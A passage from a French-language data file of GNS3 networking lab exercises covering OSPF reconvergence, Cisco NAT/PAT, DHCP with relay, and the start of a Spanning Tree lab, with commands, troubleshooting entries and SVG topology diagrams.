          { os: "linux", cmd: "R3(config)# router ospf 1\nR3(config-router)# router-id 3.3.3.3\nR3(config-router)# network 10.0.13.0 0.0.0.3 area 0\nR3(config-router)# network 10.0.23.0 0.0.0.3 area 0\nR3(config-router)# network 192.168.3.0 0.0.0.255 area 0\nR3(config-router)# passive-interface GigabitEthernet0/2", commentaire: "OSPF sur R3" },
          { os: "linux", cmd: "R1# show ip ospf neighbor", commentaire: "Vérifier les voisins OSPF — état doit être FULL pour chaque voisin" }
        ],
        erreurs_courantes: [
          {
            symptome: "Aucun voisin OSPF n'apparaît dans 'show ip ospf neighbor'",
            cause: "Mismatch de paramètres OSPF : hello/dead timer différents, area différente, ou MTU mismatch",
            solution: "Vérifier que les deux côtés d'un lien sont dans la même area (area 0). Vérifier les timers : show ip ospf interface. Sur GNS3, le MTU peut causer des problèmes : ajouter 'ip ospf mtu-ignore' sur les interfaces concernées."
          },
          {
            symptome: "Voisin en état EXSTART/EXCHANGE bloqué",
            cause: "MTU mismatch entre les interfaces des deux routeurs",
            solution: "Sur les interfaces GNS3 : R1(config-if)# ip ospf mtu-ignore (des deux côtés du lien)"
          }
        ]
      },
      {
        titre: "Étape 3 — Analyser la table OSPF et le routage",
        contexte: "Une fois les adjacences établies, OSPF échange des LSA (Link State Advertisements) et chaque routeur calcule les meilleurs chemins avec l'algorithme SPF (Dijkstra). On analyse la table OSPF et la table de routage.",
        commandes: [
          { os: "linux", cmd: "R1# show ip ospf neighbor detail", commentaire: "Détails complets des voisins : router-id, état, dead timer, interface" },
          { os: "linux", cmd: "R1# show ip ospf database", commentaire: "Base de données LSDB — voir les LSA Type 1 (router) et Type 2 (network)" },
          { os: "linux", cmd: "R1# show ip route ospf", commentaire: "Routes apprises via OSPF (marquées 'O') — doit voir 192.168.2.0 et 192.168.3.0" },
          { os: "linux", cmd: "R1# show ip ospf interface GigabitEthernet0/0", commentaire: "Détails OSPF sur l'interface : coût, hello/dead timers, DR/BDR" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Tester la reconvergence (simulation de panne)",
        contexte: "L'intérêt d'OSPF face au routage statique : si un lien tombe, OSPF recalcule automatiquement un chemin alternatif. On simule une panne en coupant le lien R1-R2 et on observe la reconvergence vers le chemin R1-R3-R2.",
        commandes: [
          { os: "linux", cmd: "# Depuis PC sur LAN R1 :\nPC1> ping 192.168.2.10 repeat 100", commentaire: "Lancer un ping continu vers le LAN R2 avant la panne" },
          { os: "linux", cmd: "# Simuler la panne du lien R1-R2 sur R1 :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# shutdown", commentaire: "Couper le lien R1 ↔ R2 — observer les pertes de ping" },
          { os: "linux", cmd: "R1# show ip route ospf", commentaire: "Observer le nouveau chemin : 192.168.2.0 doit passer maintenant par R3 (10.0.13.x)" },
          { os: "linux", cmd: "# Rétablir le lien :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# no shutdown", commentaire: "Rétablir — OSPF reconverge vers le chemin optimal" },
          { os: "linux", cmd: "R1# show ip ospf\nR1# show ip ospf statistics", commentaire: "Voir le nombre de calculs SPF effectués — augmente à chaque reconvergence" }
        ],
        erreurs_courantes: [
          {
            symptome: "Après la panne, aucun chemin alternatif n'est trouvé",
            cause: "Le réseau n'a pas de chemin redondant — vérifier la topologie",
            solution: "Dans cette topologie triangulaire, le chemin R1→R3→R2 doit exister. Vérifier que le lien R1-R3 (Gi0/1) et R3-R2 (lien 10.0.23.0/30) sont bien up et dans OSPF."
          }
        ]
      }
    ],
    checklist: [
      "show ip ospf neighbor sur R1, R2, R3 : tous les voisins en état FULL",
      "show ip route ospf sur R1 : routes vers 192.168.2.0/24 et 192.168.3.0/24 présentes (O)",
      "Ping R1 LAN → R2 LAN (192.168.1.x → 192.168.2.x) : OK",
      "Ping R1 LAN → R3 LAN (192.168.1.x → 192.168.3.x) : OK",
      "Simulation panne lien R1-R2 : reconvergence observée, ping reprend via R3",
      "show ip ospf database : LSA Type 1 présents pour les 3 router-IDs"
    ],
    tags: ["ospf", "routage-dynamique", "area0", "lsa", "dr-bdr", "convergence", "cisco", "gns3"],
    date_ajout: "2026-02-05",
    source: "École"
  },

  {
    id: 6,
    titre: "NAT statique, dynamique et PAT sur Cisco IOS",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 75,
    description: "Configurer les trois formes de NAT sur un routeur Cisco : NAT statique (1-pour-1 pour un serveur), NAT dynamique avec pool d'adresses publiques, et PAT (NAT overload) qui permet à tout un réseau privé de partager une seule adresse IP publique — la configuration la plus courante en entreprise.",
    objectifs: [
      "Distinguer et configurer NAT statique, dynamique et PAT (overload)",
      "Définir correctement les interfaces inside et outside",
      "Créer des ACL pour cibler le trafic à translater",
      "Vérifier les traductions actives avec show ip nat translations",
      "Comprendre pourquoi le PAT est la forme la plus utilisée"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+" },
      { type: "vm",       nom: "1x Cisco IOSv (routeur NAT)" },
      { type: "reseau",   nom: "Comprendre les adresses privées RFC 1918 (10.x, 172.16.x, 192.168.x)" },
      { type: "reseau",   nom: "Bases du routage statique maîtrisées" }
    ],
    schema_reseau: `<svg viewBox="0 0 620 240" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace">
  <defs>
    <marker id="arr4" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#F59E0B"/>
    </marker>
  </defs>
  <!-- Zone inside -->
  <rect x="10" y="20" width="220" height="200" rx="10" fill="rgba(59,130,246,0.05)" stroke="rgba(59,130,246,0.2)" stroke-width="1.5" stroke-dasharray="6,3"/>
  <text x="110" y="38" text-anchor="middle" fill="#3B82F6" font-size="9">INSIDE (privé)</text>
  <!-- PCs -->
  <rect x="25" y="55" width="70" height="35" rx="5" fill="#1C1917" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="60" y="70" text-anchor="middle" fill="#A8A29E" font-size="9">PC1</text>
  <text x="60" y="82" text-anchor="middle" fill="#78716C" font-size="7">192.168.1.10</text>
  <rect x="25" y="105" width="70" height="35" rx="5" fill="#1C1917" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="60" y="120" text-anchor="middle" fill="#A8A29E" font-size="9">PC2</text>
  <text x="60" y="132" text-anchor="middle" fill="#78716C" font-size="7">192.168.1.20</text>
  <rect x="25" y="155" width="70" height="35" rx="5" fill="#1C1917" stroke="#10B981" stroke-width="1.5"/>
  <text x="60" y="170" text-anchor="middle" fill="#A8A29E" font-size="9">Serveur</text>
  <text x="60" y="182" text-anchor="middle" fill="#78716C" font-size="7">192.168.1.100</text>
  <!-- SW -->
  <rect x="140" y="105" width="60" height="35" rx="5" fill="#1C1917" stroke="#44403C" stroke-width="1"/>
  <text x="170" y="120" text-anchor="middle" fill="#A8A29E" font-size="9">SW</text>
  <line x1="95" y1="72" x2="140" y2="122" stroke="#3B82F6" stroke-width="1"/>
  <line x1="95" y1="122" x2="140" y2="122" stroke="#3B82F6" stroke-width="1"/>
  <line x1="95" y1="172" x2="140" y2="132" stroke="#10B981" stroke-width="1"/>
  <!-- Routeur NAT -->
  <ellipse cx="310" cy="120" rx="44" ry="30" fill="#1C1917" stroke="#F59E0B" stroke-width="2"/>
  <text x="310" y="116" text-anchor="middle" fill="#F59E0B" font-size="11" font-weight="bold">R-NAT</text>
  <text x="310" y="131" text-anchor="middle" fill="#78716C" font-size="7">NAT/PAT</text>
  <line x1="200" y1="122" x2="266" y2="120" stroke="#F59E0B" stroke-width="2" marker-end="url(#arr4)"/>
  <text x="232" y="113" text-anchor="middle" fill="#78716C" font-size="7">Gi0/0 inside</text>
  <text x="232" y="123" text-anchor="middle" fill="#78716C" font-size="7">192.168.1.1</text>
  <!-- Zone outside -->
  <rect x="390" y="20" width="220" height="200" rx="10" fill="rgba(239,68,68,0.05)" stroke="rgba(239,68,68,0.2)" stroke-width="1.5" stroke-dasharray="6,3"/>
  <text x="500" y="38" text-anchor="middle" fill="#EF4444" font-size="9">OUTSIDE (public)</text>
  <!-- Internet/Cloud -->
  <ellipse cx="500" cy="120" rx="70" ry="50" fill="#1C1917" stroke="#EF4444" stroke-width="1.5"/>
  <text x="500" y="115" text-anchor="middle" fill="#EF4444" font-size="11">🌐</text>
  <text x="500" y="132" text-anchor="middle" fill="#A8A29E" font-size="9">Internet</text>
  <text x="500" y="145" text-anchor="middle" fill="#78716C" font-size="7">8.8.8.8...</text>
  <line x1="354" y1="120" x2="430" y2="120" stroke="#EF4444" stroke-width="2" marker-end="url(#arr4)"/>
  <text x="392" y="113" text-anchor="middle" fill="#78716C" font-size="7">Gi0/1 outside</text>
  <text x="392" y="123" text-anchor="middle" fill="#EF4444" font-size="7">203.0.113.1</text>
</svg>`,
    etapes: [
      {
        titre: "Étape 1 — Configurer les interfaces et définir inside/outside",
        contexte: "La première étape NAT est de déclarer quelle interface est 'inside' (réseau privé) et laquelle est 'outside' (vers Internet/réseau public). Ce sont des mots-clés Cisco IOS qui orientent le moteur NAT.",
        commandes: [
          { os: "linux", cmd: "R-NAT(config)# interface GigabitEthernet0/0\nR-NAT(config-if)# ip address 192.168.1.1 255.255.255.0\nR-NAT(config-if)# ip nat inside\nR-NAT(config-if)# no shutdown", commentaire: "Interface inside — réseau privé 192.168.1.0/24" },
          { os: "linux", cmd: "R-NAT(config)# interface GigabitEthernet0/1\nR-NAT(config-if)# ip address 203.0.113.1 255.255.255.252\nR-NAT(config-if)# ip nat outside\nR-NAT(config-if)# no shutdown", commentaire: "Interface outside — IP publique 203.0.113.1" },
          { os: "linux", cmd: "R-NAT(config)# ip route 0.0.0.0 0.0.0.0 203.0.113.2", commentaire: "Route par défaut vers le FAI/Internet" }
        ],
        erreurs_courantes: [
          {
            symptome: "NAT ne fonctionne pas — aucune traduction dans show ip nat translations",
            cause: "Les mots-clés 'ip nat inside' et 'ip nat outside' ne sont pas appliqués sur les bonnes interfaces",
            solution: "Vérifier avec 'show ip nat statistics' que inside et outside sont bien identifiés. Chaque interface doit avoir sa directive NAT."
          }
        ]
      },
      {
        titre: "Étape 2 — NAT statique (1-pour-1) pour le serveur",
        contexte: "Le NAT statique mappe une IP privée fixe vers une IP publique fixe. C'est utilisé pour les serveurs accessibles depuis Internet (web, mail...). Ici, le serveur 192.168.1.100 est accessible publiquement via 203.0.113.100.",
        commandes: [
          { os: "linux", cmd: "R-NAT(config)# ip nat inside source static 192.168.1.100 203.0.113.100", commentaire: "NAT statique : 192.168.1.100 ↔ 203.0.113.100 (bidirectionnel et permanent)" },
          { os: "linux", cmd: "R-NAT# show ip nat translations", commentaire: "Vérifier la traduction statique — apparaît même sans trafic actif" },
          { os: "linux", cmd: "R-NAT# show ip nat statistics", commentaire: "Statistiques NAT : hits, misses, interfaces inside/outside" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — PAT (NAT overload) pour les PCs",
        contexte: "Le PAT (Port Address Translation) permet à plusieurs hôtes privés de partager une seule IP publique. Le routeur distingue les sessions par les numéros de port TCP/UDP. C'est la configuration NAT la plus utilisée en entreprise et chez les particuliers (box FAI). On utilise une ACL pour cibler le trafic à translater.",
        commandes: [
          { os: "linux", cmd: "! Créer une ACL standard pour cibler le réseau privé\nR-NAT(config)# access-list 10 permit 192.168.1.0 0.0.0.255", commentaire: "ACL 10 : autorise tout le réseau 192.168.1.0/24 à être translaté" },
          { os: "linux", cmd: "R-NAT(config)# ip nat inside source list 10 interface GigabitEthernet0/1 overload", commentaire: "PAT : ACL 10 → IP de l'interface outside (overload = PAT)" },
          { os: "linux", cmd: "# Test : depuis PC1 (192.168.1.10), pinguer 8.8.8.8\n# Puis immédiatement :\nR-NAT# show ip nat translations", commentaire: "Observer les entrées PAT : source privée + port → IP publique + port différent" },
          { os: "linux", cmd: "R-NAT# clear ip nat translation *\nR-NAT# show ip nat translations", commentaire: "Vider la table NAT pour des tests propres" }
        ],
        erreurs_courantes: [
          {
            symptome: "Les PCs n'ont pas accès à Internet même avec PAT configuré",
            cause: "Pas de route par défaut sur le routeur, ou la route par défaut pointe vers le mauvais next-hop",
            solution: "Vérifier 'show ip route' — une route 0.0.0.0/0 doit exister. Vérifier aussi que les PCs ont bien le routeur NAT comme default gateway."
          },
          {
            symptome: "L'ACL dans la commande PAT ne match aucun trafic",
            cause: "Le numéro ou le nom de l'ACL dans la commande ip nat ne correspond pas à l'ACL créée",
            solution: "Vérifier avec 'show access-lists' que l'ACL 10 existe et correspond au bon réseau. Le wildcard 0.0.0.255 correspond au /24."
          }
        ]
      },
      {
        titre: "Étape 4 — NAT dynamique avec pool d'adresses",
        contexte: "Le NAT dynamique alloue une IP publique par session depuis un pool, sans multiplexage par port (contrairement au PAT). Moins courant, il est utile quand on dispose de plusieurs IPs publiques et qu'on veut éviter le partage de port. À titre pédagogique surtout.",
        commandes: [
          { os: "linux", cmd: "! Définir un pool d'IPs publiques\nR-NAT(config)# ip nat pool MON-POOL 203.0.113.50 203.0.113.60 netmask 255.255.255.240", commentaire: "Pool de 11 IPs publiques (203.0.113.50 à 203.0.113.60)" },
          { os: "linux", cmd: "! ACL pour cibler les hôtes\nR-NAT(config)# access-list 20 permit 192.168.1.0 0.0.0.255", commentaire: "ACL 20 — même réseau, ACL séparée pour ce NAT dynamique" },
          { os: "linux", cmd: "R-NAT(config)# ip nat inside source list 20 pool MON-POOL", commentaire: "NAT dynamique : réseau privé → pool d'IPs publiques (sans overload)" },
          { os: "linux", cmd: "R-NAT# show ip nat translations verbose", commentaire: "Affichage détaillé avec ages et flags des traductions" }
        ],
        erreurs_courantes: [
          {
            symptome: "Erreur 'pool exhausted' — le pool est épuisé",
            cause: "Plus d'hôtes que d'IPs dans le pool — chaque hôte consomme une IP entière",
            solution: "En production, utiliser le PAT (overload) à la place. Ou agrandir le pool. C'est la limitation principale du NAT dynamique sans overload."
          }
        ]
      }
    ],
    checklist: [
      "show ip nat statistics : interfaces inside et outside correctement identifiées",
      "NAT statique : show ip nat translations montre la traduction 192.168.1.100 ↔ 203.0.113.100",
      "PAT : après un ping depuis PC1, show ip nat translations montre une entrée avec port source modifié",
      "Ping depuis PC1 vers 8.8.8.8 (simulé) : fonctionnel via PAT",
      "clear ip nat translation * suivi d'un test : nouvelle entrée créée correctement"
    ],
    tags: ["nat", "pat", "overload", "cisco", "gns3", "reseau", "acl", "ip-publique"],
    date_ajout: "2026-02-10",
    source: "École"
  },

  {
    id: 7,
    titre: "Serveur DHCP Cisco IOS + ip helper-address (relay)",
    categorie: "reseau",
    niveau: "débutant",
    duree: 60,
    description: "Configurer un routeur Cisco comme serveur DHCP pour distribuer automatiquement les paramètres réseau (IP, masque, gateway, DNS) aux hôtes d'un LAN. Puis étendre le service à un deuxième LAN distant via le mécanisme ip helper-address (DHCP relay agent).",
    objectifs: [
      "Créer des pools DHCP avec exclusions d'adresses sur IOS",
      "Configurer les options DHCP essentielles (gateway, DNS, lease time)",
      "Vérifier l'attribution des IPs avec show ip dhcp binding",
      "Comprendre et configurer le ip helper-address pour relayer les broadcasts DHCP",
      "Tester l'obtention dynamique d'IP depuis les clients"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+" },
      { type: "vm",       nom: "1-2x Cisco IOSv" },
      { type: "reseau",   nom: "Comprendre le fonctionnement DORA (Discover/Offer/Request/Ack)" }
    ],
    schema_reseau: `<svg viewBox="0 0 620 260" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace">
  <defs>
    <marker id="arr5" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#F59E0B"/>
    </marker>
  </defs>
  <!-- R1 (DHCP server) -->
  <ellipse cx="300" cy="120" rx="50" ry="32" fill="#1C1917" stroke="#F59E0B" stroke-width="2"/>
  <text x="300" y="115" text-anchor="middle" fill="#F59E0B" font-size="11" font-weight="bold">R1</text>
  <text x="300" y="130" text-anchor="middle" fill="#A8A29E" font-size="8">DHCP Server</text>
  <!-- LAN 1 direct -->
  <rect x="30" y="40" width="190" height="160" rx="8" fill="rgba(59,130,246,0.05)" stroke="rgba(59,130,246,0.2)" stroke-width="1" stroke-dasharray="5,3"/>
  <text x="125" y="56" text-anchor="middle" fill="#3B82F6" font-size="8">LAN 1 — 10.0.1.0/24</text>
  <rect x="50" y="70" width="60" height="35" rx="5" fill="#1C1917" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="80" y="85" text-anchor="middle" fill="#A8A29E" font-size="9">PC1</text>
  <text x="80" y="97" text-anchor="middle" fill="#3B82F6" font-size="7">DHCP client</text>
  <rect x="50" y="120" width="60" height="35" rx="5" fill="#1C1917" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="80" y="135" text-anchor="middle" fill="#A8A29E" font-size="9">PC2</text>
  <text x="80" y="147" text-anchor="middle" fill="#3B82F6" font-size="7">DHCP client</text>
  <rect x="50" y="170" width="90" height="20" rx="4" fill="#1C1917" stroke="#44403C" stroke-width="1"/>
  <text x="95" y="183" text-anchor="middle" fill="#78716C" font-size="7">SW-LAN1</text>
  <line x1="80" y1="105" x2="80" y2="170" stroke="#3B82F6" stroke-width="1"/>
  <line x1="80" y1="155" x2="80" y2="170" stroke="#3B82F6" stroke-width="1"/>
  <line x1="140" y1="180" x2="250" y2="135" stroke="#F59E0B" stroke-width="2" marker-end="url(#arr5)"/>
  <text x="185" y="145" text-anchor="middle" fill="#78716C" font-size="7">Gi0/0 — 10.0.1.1</text>
  <!-- LAN 2 via relay -->
  <rect x="400" y="40" width="205" height="160" rx="8" fill="rgba(16,185,129,0.05)" stroke="rgba(16,185,129,0.2)" stroke-width="1" stroke-dasharray="5,3"/>
  <text x="502" y="56" text-anchor="middle" fill="#10B981" font-size="8">LAN 2 — 10.0.2.0/24</text>
  <rect x="430" y="70" width="60" height="35" rx="5" fill="#1C1917" stroke="#10B981" stroke-width="1.5"/>
  <text x="460" y="85" text-anchor="middle" fill="#A8A29E" font-size="9">PC3</text>
  <text x="460" y="97" text-anchor="middle" fill="#10B981" font-size="7">DHCP client</text>
  <rect x="430" y="120" width="90" height="20" rx="4" fill="#1C1917" stroke="#44403C" stroke-width="1"/>
  <text x="475" y="133" text-anchor="middle" fill="#78716C" font-size="7">SW-LAN2 (relay)</text>
  <line x1="460" y1="105" x2="460" y2="120" stroke="#10B981" stroke-width="1"/>
  <line x1="400" y1="130" x2="350" y2="130" stroke="#10B981" stroke-width="2" marker-end="url(#arr5)"/>
  <text x="375" y="122" text-anchor="middle" fill="#78716C" font-size="7">Gi0/1 — 10.0.2.1</text>
  <!-- relay label -->
  <text x="460" y="170" text-anchor="middle" fill="#10B981" font-size="7">ip helper-address</text>
  <text x="460" y="182" text-anchor="middle" fill="#10B981" font-size="7">10.0.1.1</text>
</svg>`,
    etapes: [
      {
        titre: "Étape 1 — Configurer les interfaces du routeur",
        contexte: "Le routeur R1 a deux interfaces LAN : Gi0/0 vers LAN1 (son réseau direct) et Gi0/1 vers LAN2 (où il faudra le relay). On commence par assigner les IPs et activer les interfaces.",
        commandes: [
          { os: "linux", cmd: "R1(config)# interface GigabitEthernet0/0\nR1(config-if)# ip address 10.0.1.1 255.255.255.0\nR1(config-if)# no shutdown\nR1(config)# interface GigabitEthernet0/1\nR1(config-if)# ip address 10.0.2.1 255.255.255.0\nR1(config-if)# no shutdown", commentaire: "Gateway LAN1 = 10.0.1.1 / Gateway LAN2 = 10.0.2.1" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Créer les pools DHCP pour chaque LAN",
        contexte: "On configure deux pools DHCP : un pour LAN1, un pour LAN2. On exclut d'abord les IPs réservées (gateways, serveurs, imprimantes) avant de créer les pools — sinon le routeur pourrait les attribuer à des clients.",
        commandes: [
          { os: "linux", cmd: "! Exclure les IPs réservées avant de créer les pools\nR1(config)# ip dhcp excluded-address 10.0.1.1 10.0.1.10\nR1(config)# ip dhcp excluded-address 10.0.2.1 10.0.2.10", commentaire: "Exclure .1 à .10 de chaque réseau (gateway + serveurs statiques)" },
          { os: "linux", cmd: "R1(config)# ip dhcp pool LAN1\nR1(dhcp-config)# network 10.0.1.0 255.255.255.0\nR1(dhcp-config)# default-router 10.0.1.1\nR1(dhcp-config)# dns-server 8.8.8.8 8.8.4.4\nR1(dhcp-config)# domain-name lan1.local\nR1(dhcp-config)# lease 1", commentaire: "Pool LAN1 : réseau, gateway, DNS, domaine, bail de 1 jour" },
          { os: "linux", cmd: "R1(config)# ip dhcp pool LAN2\nR1(dhcp-config)# network 10.0.2.0 255.255.255.0\nR1(dhcp-config)# default-router 10.0.2.1\nR1(dhcp-config)# dns-server 8.8.8.8 8.8.4.4\nR1(dhcp-config)# domain-name lan2.local\nR1(dhcp-config)# lease 1", commentaire: "Pool LAN2 — même structure, réseau différent" },
          { os: "linux", cmd: "R1# show ip dhcp pool", commentaire: "Vérifier les pools créés et leurs paramètres" }
        ],
        erreurs_courantes: [
          {
            symptome: "Le client obtient une IP dans la plage exclue",
            cause: "La commande ip dhcp excluded-address a été tapée APRÈS la création du pool",
            solution: "L'ordre n'a pas d'importance en réalité — les exclusions s'appliquent toujours. Vérifier avec 'show ip dhcp pool' que les excluded-address sont correctement listées."
          }
        ]
      },
      {
        titre: "Étape 3 — Tester l'attribution DHCP sur LAN1",
        contexte: "Les clients du LAN1 sont directement connectés à Gi0/0 — le routeur répond directement aux broadcasts DHCP. On configure les VPCS en mode DHCP et on observe l'attribution.",
        commandes: [
          { os: "linux", cmd: "# Sur PC1 (VPCS GNS3) :\nPC1> dhcp\nPC1> show ip", commentaire: "Obtenir une IP via DHCP — afficher les paramètres reçus" },
          { os: "linux", cmd: "R1# show ip dhcp binding", commentaire: "Voir les baux actifs : IP attribuée, adresse MAC, expiration" },
          { os: "linux", cmd: "R1# show ip dhcp statistics", commentaire: "Compteurs DHCP : Discover/Offer/Request/Ack reçus et envoyés" },
          { os: "linux", cmd: "R1# debug ip dhcp server events\n# Refaire un dhcp sur le client\nR1# undebug all", commentaire: "Observer le processus DORA en temps réel dans les logs" }
        ],
        erreurs_courantes: [
          {
            symptome: "Le client n'obtient pas d'adresse — timeout DHCP",
            cause: "Connectivité L2 absente entre le client et le routeur, ou service DHCP non actif",
            solution: "Vérifier le câblage dans GNS3 et que les interfaces sont up. Vérifier 'show ip dhcp server statistics' — si les Discovers n'arrivent pas, problème L2. Service DHCP actif par défaut sur IOS si un pool existe."
          }
        ]
      },
      {
        titre: "Étape 4 — Configurer le ip helper-address pour LAN2",
        contexte: "Les clients du LAN2 envoient des broadcasts DHCP — mais les routeurs ne propagent pas les broadcasts entre sous-réseaux. Le ip helper-address configure le routeur pour intercepter ces broadcasts et les retransmettre en unicast vers le serveur DHCP (ici R1 lui-même sur 10.0.1.1). C'est le relay agent DHCP (RFC 3046).",
        commandes: [
          { os: "linux", cmd: "R1(config)# interface GigabitEthernet0/1\nR1(config-if)# ip helper-address 10.0.1.1", commentaire: "Relay DHCP : broadcasts LAN2 → unicast vers 10.0.1.1 (R1 lui-même)" },
          { os: "linux", cmd: "# Sur PC3 (LAN2) :\nPC3> dhcp\nPC3> show ip", commentaire: "PC3 doit obtenir une IP dans 10.0.2.0/24 via le relay" },
          { os: "linux", cmd: "R1# show ip dhcp binding", commentaire: "Vérifier qu'un bail 10.0.2.x apparaît maintenant dans la table" },
          { os: "linux", cmd: "R1# show ip helper-address", commentaire: "Vérifier la configuration du relay sur les interfaces" }
        ],
        erreurs_courantes: [
          {
            symptome: "PC3 n'obtient toujours pas d'IP après configuration du relay",
            cause: "Le ip helper-address est configuré sur la mauvaise interface, ou l'IP du serveur DHCP est incorrecte",
            solution: "Le ip helper-address doit être sur l'interface côté LAN2 (Gi0/1), pas côté LAN1. L'IP 10.0.1.1 doit être joignable depuis R1. Vérifier avec 'show ip interface Gi0/1'."
          }
        ]
      }
    ],
    checklist: [
      "show ip dhcp pool : deux pools LAN1 et LAN2 configurés avec les bons paramètres",
      "PC1 (LAN1) obtient une IP dans 10.0.1.11-254 avec gateway 10.0.1.1 et DNS 8.8.8.8",
      "show ip dhcp binding : baux actifs visibles pour LAN1",
      "ip helper-address configuré sur Gi0/1 (interface LAN2)",
      "PC3 (LAN2) obtient une IP dans 10.0.2.11-254 via le relay",
      "show ip dhcp statistics : compteurs Discover/Offer/Request/Ack cohérents"
    ],
    tags: ["dhcp", "helper-address", "relay", "cisco", "gns3", "pool", "dora", "reseau"],
    date_ajout: "2026-02-15",
    source: "École"
  },

  {
    id: 8,
    titre: "Spanning Tree Protocol — observation et manipulation des priorités",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 75,
    description: "Observer le fonctionnement du STP (802.1D) sur une topologie redondante avec 3 switches Cisco. Identifier le Root Bridge élu automatiquement, comprendre les états des ports (Blocking/Forwarding), puis manipuler les priorités pour forcer l'élection d'un Root Bridge précis et observer la reconvergence après une panne.",
    objectifs: [
      "Comprendre pourquoi STP est nécessaire (boucles L2 et broadcast storms)",
      "Identifier le Root Bridge élu et les ports Root/Designated/Blocked",
      "Manipuler la priorité STP pour forcer l'élection d'un Root Bridge spécifique",
      "Observer la reconvergence STP après coupure d'un lien",
      "Activer PortFast et BPDU Guard sur les ports d'accès"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+" },
      { type: "vm",       nom: "3x Cisco IOSv-L2 (switches)" },
      { type: "reseau",   nom: "Notions de base sur les switches et les VLANs" }
    ],
    schema_reseau: `<svg viewBox="0 0 580 280" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace">
  <rect x="220" y="30" width="140" height="55" rx="8" fill="#1C1917" stroke="#F59E0B" stroke-width="2.5"/>
  <text x="290" y="52" text-anchor="middle" fill="#F59E0B" font-size="11" font-weight="bold">SW1 — ROOT BRIDGE</text>
  <text x="290" y="67" text-anchor="middle" fill="#78716C" font-size="8">Priorité 4096</text>
  <rect x="60" y="180" width="140" height="55" rx="8" fill="#1C1917" stroke="#3B82F6" stroke-width="2"/>
  <text x="130" y="205" text-anchor="middle" fill="#3B82F6" font-size="11" font-weight="bold">SW2</text>
  <text x="130" y="220" text-anchor="middle" fill="#78716C" font-size="8">Priorité 32768</text>
  <rect x="380" y="180" width="140" height="55" rx="8" fill="#1C1917" stroke="#3B82F6" stroke-width="2"/>
  <text x="450" y="205" text-anchor="middle" fill="#3B82F6" font-size="11" font-weight="bold">SW3</text>
  <text x="450" y="220" text-anchor="middle" fill="#78716C" font-size="8">Priorité 32768</text>
  <line x1="220" y1="70" x2="160" y2="180" stroke="#10B981" stroke-width="2.5"/>
  <line x1="360" y1="70" x2="400" y2="180" stroke="#10B981" stroke-width="2.5"/>
  <line x1="200" y1="207" x2="380" y2="207" stroke="#EF4444" stroke-width="2.5" stroke-dasharray="8,4"/>
  <text x="290" y="200" text-anchor="middle" fill="#EF4444" font-size="8">BLOQUÉ — Alternate Port</text>
</svg>`,
    etapes: [
      {
        titre: "Étape 1 — Construire la topologie et observer STP par défaut",
        contexte: "On relie les 3 switches en triangle. Sans STP, cette boucle provoquerait une broadcast storm immédiate. STP est actif par défaut sur IOS — on observe d'abord qui devient Root Bridge sans configuration manuelle.",
        commandes: [
          { os: "linux", cmd: "SW1# show spanning-tree\nSW1# show spanning-tree summary", commentaire: "Observer le Root Bridge élu — celui avec la plus petite MAC si priorités égales" },
          { os: "linux", cmd: "SW1# show spanning-tree vlan 1 detail", commentaire: "Détail STP : Bridge ID, Root ID, coûts, rôles des ports" },
          { os: "linux", cmd: "SW1# show spanning-tree vlan 1 brief", commentaire: "Vue synthétique : rôle (Root/Desg/Altn) et état (FWD/BLK) de chaque port" }
        ],
        erreurs_courantes: [
          {
            symptome: "Le réseau est inaccessible dès la connexion du troisième lien",
            cause: "STP n'est pas encore convergé — il faut attendre 30-50 secondes (Listening 15s + Learning 15s)",
            solution: "Patienter la convergence initiale. C'est normal avec 802.1D classique. Pour accélérer sur les ports d'accès, utiliser PortFast."
          }
        ]
      },
      {
        titre: "Étape 2 — Forcer l'élection du Root Bridge sur SW1",
        contexte: "Par défaut, le Root Bridge est le switch avec la priorité la plus basse (32768), départagée par la MAC la plus petite. On force SW1 à être Root Bridge en abaissant sa priorité. La priorité doit être un multiple de 4096.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# spanning-tree vlan 1 priority 4096", commentaire: "4096 < 32768 → SW1 devient Root Bridge pour VLAN 1" },
          { os: "linux", cmd: "SW1(config)# spanning-tree vlan 1 root primary", commentaire: "Méthode automatique — IOS calcule la priorité optimale" },
          { os: "linux", cmd: "SW2(config)# spanning-tree vlan 1 root secondary", commentaire: "SW2 prend priorité 28672 — devient Root si SW1 tombe" },
          { os: "linux", cmd: "SW1# show spanning-tree vlan 1 | include Root", commentaire: "Vérifier que SW1 affiche 'This bridge is the root'" }
        ],
        erreurs_courantes: [
          {
            symptome: "Erreur : 'spanning-tree vlan 1 priority 3000' refusée",
            cause: "La priorité doit être un multiple exact de 4096",
            solution: "Valeurs valides : 0, 4096, 8192, 12288, 16384, 20480, 24576, 28672, 32768... La commande 'root primary' est plus simple."
          }
        ]
      },
      {
        titre: "Étape 3 — Identifier les rôles et états des ports",
        contexte: "Une fois SW1 élu Root Bridge, on analyse les rôles STP sur chaque switch : Root Port (meilleur port vers le Root), Designated Port (forward sur chaque segment), Alternate Port (bloqué pour casser la boucle).",
        commandes: [
          { os: "linux", cmd: "SW2# show spanning-tree vlan 1", commentaire: "Identifier le Root Port (vers SW1) et le port Alternate (vers SW3 si bloqué)" },
